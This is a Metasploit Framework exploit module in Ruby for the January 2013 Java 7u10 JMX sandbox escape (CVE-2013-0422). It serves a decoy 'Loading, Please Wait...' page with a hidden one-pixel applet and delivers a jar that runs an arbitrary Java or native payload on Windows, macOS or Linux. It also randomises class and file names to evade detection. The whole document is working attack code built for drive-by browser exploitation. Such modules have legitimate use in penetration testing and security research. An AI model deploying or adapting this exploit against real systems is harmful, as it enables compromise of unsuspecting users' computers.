# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;
require &#039;rex&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  include Msf::Exploit::Remote::BrowserAutopwn
  autopwn_info({ :javascript => false })

  def initialize( info = {} )

    super( update_info( info,
      &#039;Name&#039;          => &#039;Java Applet JMX Remote Code Execution&#039;,
      &#039;Description&#039;   => %q{
          This module abuses the JMX classes from a Java Applet to run arbitrary Java
        code outside of the sandbox as exploited in the wild in January of 2013. The
        vulnerability affects Java version 7u10 and earlier.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        => [
        &#039;Unknown&#039;, # Vulnerability discovery
        &#039;egypt&#039;, # Metasploit module
        &#039;sinn3r&#039;, # Metasploit module
        &#039;juan vazquez&#039; # Metasploit module
      ],
      &#039;References&#039;    =>
        [
          [ &#039;CVE&#039;, &#039;2013-0422&#039; ],
          [ &#039;URL&#039;, &#039;http://malware.dontneedcoffee.com/2013/01/0-day-17u10-spotted-in-while-disable.html&#039; ],
          [ &#039;URL&#039;, &#039;http://labs.alienvault.com/labs/index.php/2013/new-year-new-java-zeroday/&#039; ]
        ],
      &#039;Platform&#039;      => [ &#039;java&#039;, &#039;win&#039;, &#039;osx&#039;, &#039;linux&#039; ],
      &#039;Payload&#039;       => { &#039;Space&#039; => 20480, &#039;BadChars&#039; => &#039;&#039;, &#039;DisableNops&#039; => true },
      &#039;Targets&#039;       =>
        [
          [ &#039;Generic (Java Payload)&#039;,
            {
              &#039;Platform&#039; => [&#039;java&#039;],
              &#039;Arch&#039; => ARCH_JAVA,
            }
          ],
          [ &#039;Windows x86 (Native Payload)&#039;,
            {
              &#039;Platform&#039; => &#039;win&#039;,
              &#039;Arch&#039; => ARCH_X86,
            }
          ],
          [ &#039;Mac OS X x86 (Native Payload)&#039;,
            {
              &#039;Platform&#039; => &#039;osx&#039;,
              &#039;Arch&#039; => ARCH_X86,
            }
          ],
          [ &#039;Linux x86 (Native Payload)&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039; => ARCH_X86,
            }
          ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jan 10 2013&#039;
      ))
  end


  def setup
    path = File.join(Msf::Config.install_root, "data", "exploits", "j7u10_jmx", "Exploit.class")
    @exploit_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
    path = File.join(Msf::Config.install_root, "data", "exploits", "j7u10_jmx", "B.class")
    @loader_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }

    @exploit_class_name = rand_text_alpha("Exploit".length)
    @exploit_class.gsub!("Exploit", @exploit_class_name)
    super
  end

  def on_request_uri(cli, request)
    print_status("handling request for #{request.uri}")

    case request.uri
    when /\.jar$/i
      jar = payload.encoded_jar
      jar.add_file("#{@exploit_class_name}.class", @exploit_class)
      jar.add_file("B.class", @loader_class)
      metasploit_str = rand_text_alpha("metasploit".length)
      payload_str = rand_text_alpha("payload".length)
      jar.entries.each { |entry|
        entry.name.gsub!("metasploit", metasploit_str)
        entry.name.gsub!("Payload", payload_str)
        entry.data = entry.data.gsub("metasploit", metasploit_str)
        entry.data = entry.data.gsub("Payload", payload_str)
      }
      jar.build_manifest

      send_response(cli, jar, { &#039;Content-Type&#039; => "application/octet-stream" })
    when /\/$/
      payload = regenerate_payload(cli)
      if not payload
        print_error("Failed to generate the payload.")
        send_not_found(cli)
        return
      end
      send_response_html(cli, generate_html, { &#039;Content-Type&#039; => &#039;text/html&#039; })
    else
      send_redirect(cli, get_resource() + &#039;/&#039;, &#039;&#039;)
    end

  end

  def generate_html
    html  = %Q|<html><head><title>Loading, Please Wait...</title></head>|
    html += %Q|<body><center><p>Loading, Please Wait...</p></center>|
    html += %Q|<applet archive="#{rand_text_alpha(8)}.jar" code="#{@exploit_class_name}.class" width="1" height="1">|
    html += %Q|</applet></body></html>|
    return html
  end

end

